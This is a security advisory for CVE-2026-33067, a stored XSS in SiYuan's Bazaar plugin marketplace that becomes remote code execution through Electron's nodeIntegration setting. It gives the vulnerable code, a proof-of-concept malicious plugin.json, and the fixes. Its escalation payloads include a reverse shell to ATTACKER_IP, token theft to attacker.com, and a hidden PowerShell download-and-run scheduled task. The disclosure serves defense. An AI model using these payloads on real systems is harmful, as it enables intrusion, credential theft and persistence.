# [M] SiYuan has Stored XSS to RCE via Unsanitized Bazaar Package Metadata

## Summary
Severity: Medium
Advisory: GHSA-mvpm-v6q4-m2pf
Aliases: CVE-2026-33067, GO-2026-4747
Ecosystem: Go
Published: 2026-03-18
Source: https://osv.dev/vulnerability/GHSA-mvpm-v6q4-m2pf
Type: osv

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260317012524-fe4523fff2c8

## Details
# Stored XSS to RCE via Unsanitized Bazaar Package Metadata

## Summary

SiYuan's Bazaar (community marketplace) renders package metadata fields (`displayName`, `description`) using template literals without HTML escaping. A malicious package author can inject arbitrary HTML/JavaScript into these fields, which executes automatically when any user browses the Bazaar page. Because SiYuan's Electron configuration enables `nodeIntegration: true` with `contextIsolation: false`, this XSS escalates directly to full Remote Code Execution on the victim's operating system — with zero user interaction beyond opening the marketplace tab.

## Affected Component

- **Metadata rendering**: `app/src/config/bazaar.ts:275-277`
- **Electron config**: `app/electron/main.js:422-426` (`nodeIntegration: true`, `contextIsolation: false`)

## Affected Versions

- SiYuan <= 3.5.9

## Severity

**Critical** — CVSS 9.6 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

- CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS)

## Vulnerable Code

In `app/src/config/bazaar.ts:275-277`, package metadata is injected directly into HTML templates without escaping:

```typescript
// Package name injected directly — NO escaping
${item.preferredName}${item.preferredName !== item.name
    ? ` <span class="ft__on-surface ft__smaller">${item.name}</span>` : ""}

// Package description — title attribute uses escapeAttr(), but text content does NOT
<div class="b3-card__desc" title="${escapeAttr(item.preferredDesc) || ""}">
    ${item.preferredDesc || ""}  <!-- UNESCAPED HTML -->
</div>
```

The inconsistency is notable: the `title` attribute is escaped via `escapeAttr()`, but the actual rendered text content is not — indicating the risk was partially recognized but incompletely mitigated.

The Electron renderer at `app/electron/main.js:422-426` is configured with:

```javascript
webPreferences: {
    nodeIntegration: true,
    contextIsolation: false,
    // ...
}
```

This means any JavaScript executing in the renderer process has direct access to Node.js APIs including `require('child_process')`, `require('fs')`, and `require('os')`.

## Proof of Concept

### Step 1: Create a malicious plugin manifest

Create a GitHub repository with a valid SiYuan plugin structure. In `plugin.json`:

```json
{
    "name": "helpful-productivity-plugin",
    "displayName": {
        "default": "Helpful Plugin<img src=x onerror=\"require('child_process').exec('calc.exe')\">"
    },
    "description": {
        "default": "Boost your productivity with smart templates"
    },
    "version": "1.0.0",
    "author": "attacker",
    "url": "https://github.com/attacker/helpful-productivity-plugin",
    "minAppVersion": "2.0.0"
}
```

### Step 2: Submit to Bazaar

Submit the repository to the SiYuan Bazaar community marketplace via the standard contribution process (pull request to the bazaar index repository).

### Step 3: Zero-click RCE

When **any** SiYuan desktop user navigates to **Settings > Bazaar > Plugins**, the package listing renders the malicious `displayName`. The `<img src=x>` tag fails to load, firing the `onerror` handler, which calls `require('child_process').exec('calc.exe')`.

**No click is required.** The payload executes the moment the Bazaar page loads and the package card is rendered in the DOM.

### Escalation: Reverse shell

```json
{
    "displayName": {
        "default": "Helpful Plugin<img src=x onerror=\"require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\\"')\">"
    }
}
```

### Escalation: Data exfiltration (API token theft)

```json
{
    "displayName": {
        "default": "<img src=x onerror=\"fetch('https://attacker.com/exfil?token='+require('fs').readFileSync(require('path').join(require('os').homedir(),'.config/siyuan/cookie.key'),'utf8'))\">"
    }
}
```

### Escalation: Silent persistence (Windows)

```json
{
    "displayName": {
        "default": "<img src=x onerror=\"require('child_process').exec('schtasks /create /tn SiYuanUpdate /tr \\\"powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\\\\\\\"https://attacker.com/payload.ps1\\\\\\\")\\\" /sc onlogon /rl highest /f')\">"
    }
}
```

## Attack Scenario

1. Attacker creates a legitimate-looking GitHub repository with a SiYuan plugin/theme/template.
2. Attacker submits it to the SiYuan Bazaar via the standard community contribution process.
3. The `plugin.json` manifest contains an XSS payload in the `displayName` or `description` field.
4. When **any** SiYuan desktop user opens the Bazaar tab, the malicious package card renders the unescaped metadata.
5. The injected `<img onerror>` (or `<svg onload>`, `<details ontoggle>`, etc.) fires automatically.
6. JavaScript executes in the Electron renderer with full Node.js access (`nodeIntegration: true`).
7. The attacker achieves arbitrary OS command execution — reverse shell, data exfiltration, persistence, ransomware, etc.

**The user does not need to install, click, or interact with the malicious package in any way.** Browsing the marketplace is sufficient.

## Impact

- **Full remote code execution** on any SiYuan desktop user who browses the Bazaar
- **Zero-click** — payload fires on page load, no interaction required
- **Supply-chain attack** — targets the entire SiYuan user community via the official marketplace
- Can steal API tokens, session cookies, SSH keys, browser credentials, and arbitrary files
- Can install persistent backdoors, scheduled tasks, or ransomware
- Affects all platforms: Windows, macOS, Linux

## Suggested Fix

### 1. Escape all package metadata in template rendering (`bazaar.ts`)

```typescript
function escapeHtml(str: string): string {
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;')
              .replace(/>/g, '&gt;').replace(/"/g, '&quot;')
              .replace(/'/g, '&#039;');
}

// Apply to ALL user-controlled metadata before rendering
${escapeHtml(item.preferredName)}
<div class="b3-card__desc">${escapeHtml(item.preferredDesc || "")}</div>
```

### 2. Server-side sanitization in the Bazaar index pipeline

Sanitize metadata fields at the Bazaar index build stage so malicious content never reaches clients:

```go
func sanitizePackageDisplayStrings(pkg *Package) {
    if pkg == nil {
        return
    }
    for k, v := range pkg.DisplayName {
        pkg.DisplayName[k] = html.EscapeString(v)
    }
    for k, v := range pkg.Description {
        pkg.Description[k] = html.EscapeString(v)
    }
}
```

### 3. Long-term: Harden Electron configuration

```javascript
webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    sandbox: true,
}
```

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-mvpm-v6q4-m2pf
- https://nvd.nist.gov/vuln/detail/CVE-2026-33067
- https://github.com/siyuan-note/siyuan
